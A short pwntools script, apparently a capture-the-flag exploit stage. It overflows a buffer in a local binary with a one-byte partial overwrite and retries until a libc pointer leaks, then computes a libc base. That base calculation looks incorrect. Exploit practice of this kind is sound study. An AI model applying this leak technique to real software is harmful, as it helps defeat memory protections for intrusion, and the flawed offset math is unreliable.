from pwn import *

DEBUG = True

def reads(data):
    r.sendline(b"1")
    print(r.recvuntil(b"read:"))
    r.send(data)
    print(r.recvuntil(b"do?"))

def show():
    r.sendline(b"2")
    return r.recvuntil(b"do?")

# 0x7ffeb580d1d8 --> 0x7f9fbcc980b3 (<__libc_start_main+243>:       mov    edi,eax) 

while(True):
    if DEBUG:
        r = process("./reader")
    else:
        r = remote("")

    print(r.recvuntil(b"today?"))
    r.sendline(b"0")

    payload = b"a"*32 + b"\x48"
    reads(payload)
    result = show()
    if b"\x7f" in result and b"\xb3" in result:
        gdb.attach(r, api=True)
        leak = result.split(b"\n\nInput shown")[0][-6:]
        libstart243 = int.from_bytes(leak, 'little')
        libbase = libstart243 - 243
        print(libbase)
        r.interactive()
    else:
        r.close()
        continue
        
    exit(0)